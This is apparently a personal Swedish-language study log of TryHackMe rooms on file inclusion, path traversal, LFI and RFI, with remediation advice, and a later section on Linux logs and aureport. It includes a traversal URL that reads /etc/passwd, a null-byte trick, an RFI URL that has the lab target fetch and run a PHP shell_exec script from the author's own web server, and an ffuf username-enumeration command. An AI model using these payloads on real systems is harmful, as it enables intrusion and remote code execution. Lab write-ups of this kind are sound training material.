# File Inclusion

Det här rummet tacklar allt från local file inclusion och remote file inclusion till path traversal samt hur man bör motverka detta. Det stora problemet, oftast, är att det saknas input validation vilket skapar sårbarheter.

## Path Traversal

Detta går ut på att man vandrar runt på servern genom URL:en på en oskyddad hemsida, ett exempel från THM är <code>http://webapp.thm/get.php?file=../../../../etc/passwd</code>, här har vi alltså valt att hämta en fil som ligger någon annanstans än vad servern har tänkt, vi har i princip kört <code>cat ../../../../etc/passwd</code> och därmed får vi avläsa passwd-filen i den här Linux-servern.

Jag misstänker nästan att den här informationen är lite gammal då de tycker att man ska kunna leta rätt på <code>C:\boot.ini</code> eller <code>C:\Windows\boot.ini</code> och jag hittar inte en sådan fil på min egen dator, så det är nog en standard som inte längre är sann.

Jag har för mig att de som ska finns på moderna Windows-maskiner är <code>C:\Windows\System32\drivers\etc\hosts</code> och/eller <code>C:\Windows\win.ini</code>.

## LFI

I det här fallet tittar vi närmast på LFI genom PHP. Men andra språk har också liknande sårbarheter. Jag får lära mig att inom PHP-funktionen så kan man specificera vilka kataloger man ska hämta saker från, i labb två så ska filen man letar efter börja i katalogen "includes", och efter det så går det att använda sig av klassisk path traversal för att hoppa ut ur den katalogen. 

Vid labb 3 blev de lite luriga. Först och främst så behövde jag använda mig av en nullbyte <code>%00</code> för att avbryta funktionen eftersom den letade en .php-fil. Sedan fungerade inte sökfunktionen längre så jag blev tvungen att använda adressfältet för att utföra detta.

Uppgift 4 så ville de bara veta namnet på funktionen som "causing the directory traversal", vilket var samma som tidigare, file_get_contents.

Den sista här var också lite kul, den krävde att man har en viss katalog i sökningen, så om man börjar med den i URL:en så går det vägen!

## RFI

Nu börjar vi titta på Remote File Inclusion. Som med LFI så handlar det om att man inte hanterar input validation ordentligt. Skillnaden är att man kan injicera en extern URL in i include-funktionen. Genom RFI så kan man uppnå RCE (Remote Code Execution) vilket gör RFI generellt sett farligare än LFI.

## Remediation

Det gamla vanliga. Uppdatera och se till att allting är uppdaterat gällande webbapplikationen/servern/frameworks osv.

En WAF är alltid ett bra skydd.

Stäng av PHP errors och vissa funktioner som kan orsaka LFI och RFI.

Lita aldrig på användarens input, se till att validera!

White listning för filnamn och kataloger, använd också black lists.

## Challenges

Okej, de här utmaningarna var riktigt roliga. Lite galet att de är så tidigt i Jr Pentesting-pathen bara.

Första tre utmaningarna var ganska krångliga burp suite-grejer där jag var tvungen att byta till POST från GET requests, sedan var jag tvungen att modifiera en cookie och genom den utföra en path traversal. Tredje utmaningen hade ett ordentligt filter som tog bort alla specialtecken och siffror, så jag kunde inte köra encoding. Behövde också byta till POST där för att få den att fungera.

Sista tyckte jag var helt klart överkurs för var jag är i pathen. Den förväntade sig att jag skulle utföra en RFI från min VM. Så jag bad Claude göra ett enkelt script för att köra hostname-kommandot, <code>\<?php echo shell_exec('hostname'); ?></code>. Så hostade jag den genom en egen enkel python web server med <code>python3 -m http.server 9999</code> sedan fick jag köra följande URL för att aktivera det: <code>http://10.112.153.82/playground.php?file=http://192.168.195.64:9999/hostname.php</code>.

Som sagt, lite överkurs kan jag tycka, men roligt var det!

<code>ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.114.184.16/customers/signup -mr "username already exists"</code>

## Logs

Nu får vi titta på lite mer tekniska aspekter, faktiska loggar, som har värde inom auditing, monitoring, troubleshooting och compliance. Så det är viktigt med loggar!

Vi öppnar med att titta på linux loggar som oftast finns i <code>/var/logs</code>. Det nämns också att det finns olika typer av tjänster/daemons som hanterar och skapar loggar, exempel de tar upp är <code>rsyslog</code>, <code>syslog-ng</code> och <code>journald</code>. Vi kommer titta på systemloggar, applikationsloggar och säkerhetsloggar.

Jag får prova använda <code>aureport</code>, ett program för att göra en audit på systemloggar i Linux. Testar det parallellt med min egna Kali-maskin men det var inte installerat så jag installerar det. Sedan testar jag att se om det fungerar där med och det gör det inte. Undra om det är för att min kali-maskin inte har rsyslog eller syslog-ng.

<code>ausearch --message USER_LOGIN --success yes --interpret</code> är ett kommando vi får titta på, sedan har vi nedan förklaring för användning av <code>aureport</code>:

- <code>--message</code> is followed by the message we are interested in searching for. Examples include <code>USER_LOGIN</code>, <code>DEL_USER</code>, <code>ADD_GROUP</code>, <code>USER_CHAUTHTOK</code>, <code>DEL_GROUP</code>, <code>CHGRP_ID</code>, <code>ROLE_ASSIGN</code>, and <code>ROLE_REMOVE</code>.
- <code>--success</code> is followed by <code>yes</code> or <code>no</code> depending on whether you are searching for successful or unsuccessful attempts, respectively.
- <code>--interpret</code> converts numeric entities, such as UID (User ID), into text.
